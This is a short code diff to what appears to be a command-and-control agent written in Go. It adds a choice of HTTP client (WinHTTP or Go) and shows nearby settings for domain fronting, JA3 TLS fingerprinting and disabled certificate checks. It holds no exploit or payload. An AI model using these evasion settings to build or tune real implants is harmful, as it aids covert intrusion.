@@ -57,6 +57,9 @@ var headers = ""
 // host a specific HTTP header used with HTTP communications; notably used for domain fronting
 var host = ""
 
+// httpClient is a string that represents what type of HTTP client the Agent should use (e.g., winhttp, go)
+var httpClient = "go"
+
 // ja3 a string that represents how the Agent should configure it TLS client
 var ja3 = ""
 
@@ -138,6 +141,7 @@ func run(URL string) {
 		clientConfig := http.Config{
 			AgentID:      a.ID(),
 			Protocol:     protocol,
+			ClientType:   httpClient,
 			Host:         host,
 			Headers:      headers,
 			Proxy:        proxy,
@@ -150,6 +154,10 @@ func run(URL string) {
 			Opaque:       opaque,
 			Transformers: transforms,
 			InsecureTLS:  !verify,
+		}
+
+		if strings.ToLower(httpClient) == "winhttp" && strings.ToLower(protocol) == "h2" {
+			clientConfig.Protocol = "https"
 		}
 
 		// URL is the value passed into this function; url is the global variable
